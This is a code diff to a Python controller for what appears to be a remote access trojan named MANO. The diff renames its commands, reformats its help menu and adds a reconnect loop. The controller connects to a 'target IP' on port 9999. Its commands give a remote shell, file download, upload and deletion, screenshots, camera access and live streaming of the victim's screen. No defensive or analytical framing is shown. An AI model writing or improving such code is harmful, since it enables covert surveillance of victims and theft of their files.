@@ -23,15 +23,15 @@ print("\n******************************************************")
 def sock():
     try:
         s = socket.socket()
-        host= input('Enter Target IP :')
+        host= input('Enter Target IP or q or Q to exit :')
+        if host=='q' or host=='Q':
+            exit(0)
         port = 9999
         s.connect((host, port))
         return(host,s)
     except:
         print("Error: In binding")
-        sock()
-host,s=sock()
-
+        return sock()
 #deletemenu
 
 def dmenu(nm):
@@ -318,13 +318,13 @@ def mano(cip,conn):
             fdown(conn)
         elif cli=='fup':
             fup(conn)
-        elif cli=='flist':
+        elif cli=='fl':
             flist()
-        elif cli=='cflist':
+        elif cli=='cfl':
             cflist(conn)
-        elif cli=='chdir':
+        elif cli=='cd':
             chdir()
-        elif cli=='cchdir':
+        elif cli=='ccd':
             cchdir(conn)
         elif cli=='cdel':
            if(cdel(conn)):
@@ -332,11 +332,11 @@ def mano(cip,conn):
         elif cli=='fdel':
              if(fdel()):
                  print("SUCCESS!")
-        elif cli=='getcd':
-             print("your current working dir :"+os.getcwd())
-        elif cli=='getccd':
+        elif cli=='pwd':
+             print("your current working directory :"+os.getcwd())
+        elif cli=='cwd':
              conn.send(('cwd~s').encode("utf-8"))
-             print("client current working dir :"+conn.recv(1024).decode("utf-8"))
+             print("client current working directory :"+conn.recv(1024).decode("utf-8"))
         elif cli=='sshot':
              conn.send(('sshot~s').encode("utf-8"))
              msg=conn.recv(1024).decode("utf-8")
@@ -351,20 +351,30 @@ def mano(cip,conn):
             conn.send(('sst~s').encode("utf-8"))
             stream(conn)
         elif cli=='back':
+            conn.send(('back~s').encode("utf-8"))
             return
         elif cli=='exit':
             conn.send(('exit~s').encode("utf-8"))
             return
         elif cli == 'help':
             print("""
-shell --> To open cmd or terminal \n
-fdown --> to download files from client\nfup --> upload files to client \n
-flist --> List files in current dir \ncflist --> List files in client's current dir \n
-getcd --> Get current dir\ngetccd --> Get client's current dir \n
-chdir --> Change current dir\ncchdir --> Change client's current dir \n
-fdel --> Delete file in current dir \ncdel --> Delete file from client's current dir \n
-sshot --> Take screenshot\ncam --> To access client camera\nsst --> Screen Stream\n
-help --> help \nback --> back to MANO\nexit -->to terminate : """+cip+"""\n""")
+shell   --> To open cmd or terminal\n
+fdown   --> To download files from client\n
+fup     --> Upload files to client\n
+fl      --> List of files in your current directory\n
+cfl     --> List of files in client's current directory\n
+pwd     --> Get your current directory\n
+cwd     --> Get client's current directory\n
+cd      --> Change your current directory\n
+ccd     --> Change client's current directory\n
+fdel    --> Delete file in your current directory\n
+cdel    --> Delete file from client's current directory\n
+sshot   --> To take screenshot of clint's screen\n
+cam     --> To access client camera\n
+sst     --> To stream client screen\n
+help    --> Help \n
+back    --> Back to MANO\n
+exit    --> To terminate : """+cip+"""\n""")
         else :
               print("Command not recognized")
 
@@ -389,4 +399,6 @@ def sendcommands(conn):
                 break
     except:
         print("Error while connecting Shell")
-mano(host,s)
+while True:
+    host,s=sock()
+    mano(host,s)
